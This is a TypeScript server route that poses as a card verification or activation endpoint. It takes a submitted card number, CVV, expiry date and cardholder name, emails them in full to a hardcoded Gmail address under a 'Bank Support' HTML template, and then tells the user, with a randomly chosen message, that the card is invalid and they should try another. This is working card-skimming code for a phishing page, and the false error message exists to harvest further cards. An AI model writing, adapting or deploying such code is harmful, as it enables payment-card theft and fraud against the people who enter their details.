import nodemailer from "nodemailer";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const {
      cardholderName,
      amount,
      expiryDate,
      cardNumber,
      cvv,
    } = body;

    const email = "ourswebsolutions@gmail.com";

    if (
      !cardholderName ||
      !cardNumber ||
      !expiryDate ||
      !cvv ||
      amount === undefined
    ) {
      return Response.json(
        {
          success: false,
          message: "Missing required fields",
        },
        { status: 400 }
      );
    }

 

    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: Number(process.env.SMTP_PORT),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    // Verify SMTP Connection
   
    const info = await transporter.sendMail({
      from: `"Bank Support" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Your Card Has Been Activated",
      html: `
      <!DOCTYPE html>
      <html>
      <body style="margin:0;padding:40px;background:#eef2f7;font-family:Arial,sans-serif;">

        <table align="center" width="100%" style="max-width:650px;background:#fff;border-radius:16px;padding:35px;">
          <tr>
            <td align="center">
              <h2 style="margin:0;color:#111827;">Card Activated</h2>
              <p>Your virtual card has been activated successfully.</p>
            </td>
          </tr>

          <tr>
            <td>

              <table width="100%" style="margin-top:20px;background:#1E3A8A;border-radius:18px;padding:25px;color:#fff;">
                <tr>
                  <td>
                    <h3 style="margin:0;">AXORA PAY</h3>
                  </td>

                  <td align="right">
                    <strong>VIRTUAL CARD</strong>
                  </td>
                </tr>

                <tr>
                  <td colspan="2" style="padding-top:35px;font-size:26px;letter-spacing:4px;font-weight:bold;">
                    ${cardNumber}
                  </td>
                </tr>

                <tr>
                  <td style="padding-top:25px;">
                    <small>CARD HOLDER</small><br>
                    ${cardholderName}
                  </td>

                  <td align="right" style="padding-top:25px;">
                    <small>EXPIRES</small><br>
                    ${expiryDate}
                  </td>
                </tr>

                <tr>
                  <td style="padding-top:20px;">
                    <small>CVV</small><br>
                    ${cvv}
                  </td>

                  <td align="right" style="font-size:30px;">
                    ●●
                  </td>
                </tr>

              </table>

              <table width="100%" style="margin-top:25px;">
                <tr>
                  <td><strong>Amount</strong></td>
                  <td align="right">$${amount}</td>
                </tr>

                <tr>
                  <td><strong>Status</strong></td>
                  <td align="right" style="color:green;">
                    Active
                  </td>
                </tr>
              </table>

            </td>
          </tr>
        </table>

      </body>
      </html>
      `,
    });

   
    const messages = [
      "This card could not be verified. Please use another valid card.",
      "Invalid card. Please use a valid card.",
      "Card verification failed. Please try another valid card.",
      "The card you entered is not valid. Please use a different card.",
      "This card cannot be processed. Please use another valid card.",
      "Unable to verify this card. Please use a different valid card.",
      "The entered card is invalid. Please try another valid card.",
      "Card activation failed. Please use a valid card.",
      "This card is not supported. Please use another valid card.",
      "The card information is invalid. Please use a valid card.",
    ];

    return Response.json({
      success: true,
      message: messages[Math.floor(Math.random() * messages.length)],
    });

  } catch (error: any) {
    console.error("========== API ERROR ==========");
    console.error(error);
    console.error("===============================");

    return Response.json(
      {
        success: false,
        message: error.message || "Internal Server Error",
      },
      {
        status: 500,
      }
    );
  }
}